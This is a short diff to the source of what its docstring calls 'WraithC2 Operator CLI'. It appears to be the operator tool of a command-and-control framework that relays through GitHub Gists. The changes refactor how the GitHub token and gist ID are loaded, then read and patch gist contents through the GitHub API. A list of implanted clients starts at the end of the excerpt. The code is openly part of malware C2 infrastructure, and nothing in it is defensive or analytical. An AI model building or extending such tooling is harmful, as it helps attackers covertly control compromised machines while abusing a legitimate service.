@@ -1,4 +1,4 @@
-﻿#!/usr/bin/env python3
+#!/usr/bin/env python3
 """
 WraithC2 Operator CLI
 =====================
@@ -50,18 +50,21 @@ def _safe_import_config():
 
 GIST_API = 'https://api.github.com/gists'
 
-def _gh_headers() -> dict:
+def _gh_headers(cfg: dict = None) -> dict:
+    if cfg is None:
+        cfg = _safe_import_config()
     return {
-        'Authorization':        f'token {GITHUB_TOKEN}',
+        'Authorization':        f'token {cfg["GITHUB_TOKEN"]}',
         'Accept':               'application/vnd.github+json',
         'X-GitHub-Api-Version': '2022-11-28',
         'Cache-Control':        'no-cache',
     }
 
 def gist_read() -> dict:
+    cfg = _safe_import_config()
     r = requests.get(
-        f'{GIST_API}/{GIST_ID}',
-        headers=_gh_headers(),
+        f'{GIST_API}/{cfg["GIST_ID"]}',
+        headers=_gh_headers(cfg),
         params={'_t': int(time.time())},
         timeout=15,
     )
@@ -70,8 +73,9 @@ def gist_read() -> dict:
     return {k: (v.get('content') or '') for k, v in files.items()}
 
 def gist_patch(files: dict):
+    cfg = _safe_import_config()
     payload = {'files': {k: {'content': v if v and v.strip() else '-'} for k, v in files.items()}}
-    requests.patch(f'{GIST_API}/{GIST_ID}', headers=_gh_headers(), json=payload, timeout=15)
+    requests.patch(f'{GIST_API}/{cfg["GIST_ID"]}', headers=_gh_headers(cfg), json=payload, timeout=15)
 
 def list_clients(files: dict) -> list:
     clients = []
